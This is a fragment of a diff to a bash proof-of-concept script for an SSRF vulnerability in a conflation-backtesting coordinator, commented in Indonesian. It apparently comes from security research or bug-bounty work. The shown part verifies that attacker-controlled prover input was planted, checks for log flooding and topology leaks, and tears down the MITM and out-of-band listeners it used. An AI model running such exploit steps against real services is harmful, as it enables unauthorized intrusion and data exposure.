-  for f in $(find "$HOST_DATA/conflation-backtesting/$JOB_FILE" -name "*.json" -type f 2>/dev/null | head -3); do
+  JDIR="$HOST_DATA/conflation-backtesting/$JOB_FILE"
+  find "$JDIR" -type f 2>/dev/null | head -10 | sed 's/^/    /'
+  for f in $(find "$JDIR" -name "*.json" -type f 2>/dev/null | head -3); do
     echo "    --- $(basename "$f")"
     grep -oE '"conflatedExecutionTracesFile"[^,}]*|"tracesEngineVersion"[^,}]*' "$f" | head -4 | sed 's/^/      /'
   done
-  # Check for marker
-  if find "$HOST_DATA/conflation-backtesting/$JOB_FILE" -name "*.json" -exec grep -l "$MARK" {} \; 2>/dev/null | grep -q .; then
-    echo "    [!!!] MARKER $MARK ditemukan di request file - PROVER INPUT CONTROL TERBUKTI"
+  if find "$JDIR" -name "*.json" -exec grep -l "$MARK" {} \; 2>/dev/null | grep -q .; then
+    echo "    [!!!] MARKER $MARK di request file - PROVER INPUT CONTROL TERBUKTI"
   fi
+  if find "$JDIR" -name "*attacker-1*" 2>/dev/null | grep -q .; then
+    echo "    [!!!] tracesEngineVersion attacker tertanam di NAMA file request (etvattacker-1)"
+  fi
+  echo "    (pembanding) Log job FILE (di mana job berhenti):"
+  docker logs "$COORD" 2>&1 | grep "job_${JOB_FILE}" | grep -v coordinatorConfig= | tail -8 | cut -c1-250 | sed 's/^/      /'
 else
-  echo "    (skip - HOST_DATA atau JOB_FILE tidak tersedia)"
+  echo "    (skip - HOST_DATA / JOB_FILE tidak tersedia)"
 fi
 
-echo -e "\n(D) Traces files di shared FS:"
-ls -la "$HOST_DATA/traces/v2/conflated/" 2>/dev/null | tail -5 | sed 's/^/    /'
+echo -e "\n(D) Traces files di shared FS (termasuk file attacker):"
+ls -la "$HOST_DATA/traces/v2/conflated/" 2>/dev/null | tail -6 | sed 's/^/    /'
 
-echo -e "\n(E) Retry/log flooding check:"
-RETRY_COUNT=$(docker logs "$COORD" 2>&1 | grep -c "already retried" || echo 0)
-echo "    Total 'already retried' lines: $RETRY_COUNT"
+echo -e "\n(E) Retry/log flooding:"
+RETRY_COUNT=$(docker logs "$COORD" 2>&1 | grep -c "already retried" || true)
+echo "    Total 'already retried' lines: ${RETRY_COUNT:-0}"
 
-echo -e "\n(F) Config dump evidence (topology leak):"
-docker logs "$COORD" 2>&1 | grep -oE "endpoints=\[http://[^\]]+\]" | sort -u | head -10 | sed 's/^/    /'
+echo -e "\n(F) Topology disclosure (config dump):"
+docker logs "$COORD" 2>&1 | grep -c "Conflation backtesting coordinatorConfig=" | sed 's/^/    baris config dump: /'
+docker logs "$COORD" 2>&1 | grep -oE "endpoints=\[[^]]+\]" | sort -u | head -8 | sed 's/^/    /'
 
 # ==============================================================================
 # CLEANUP
@@ -499,18 +463,14 @@ docker logs "$COORD" 2>&1 | grep -oE "endpoints=\[http://[^\]]+\]" | sort -u | h
 echo -e "\n=============== CLEANUP ==============="
 kill $OOB_PID $MITM_PID 2>/dev/null
 fuser -k 12345/tcp 12346/tcp 2>/dev/null
-echo "[+] Listener dibunuh. Restart coordinator untuk hapus job zombie:"
+echo "[+] Listener dibunuh. Bersihkan job zombie:"
 echo "    docker restart $COORD"
 [ -n "$HOST_DATA" ] && echo "    rm -rf $HOST_DATA/conflation-backtesting/*"
 
 echo ""
-echo "Evidence tersimpan:"
-echo "    - $OUT (output lengkap run ini)"
-echo "    - /tmp/ssrf_mitm_log.txt (MITM log)"
-echo "    - /tmp/ssrf_oob_capture.txt (OOB capture)"
-echo ""
+echo "Evidence: $OUT | /tmp/ssrf_mitm_log.txt | /tmp/ssrf_oob_capture.txt"
 echo "Selesai."
 FINALEOF
 
-chmod +x poc.sh
-echo "[+] Script siap: poc.sh"
+chmod +x poc_ssrf_final.sh
+./poc_ssrf_final.sh
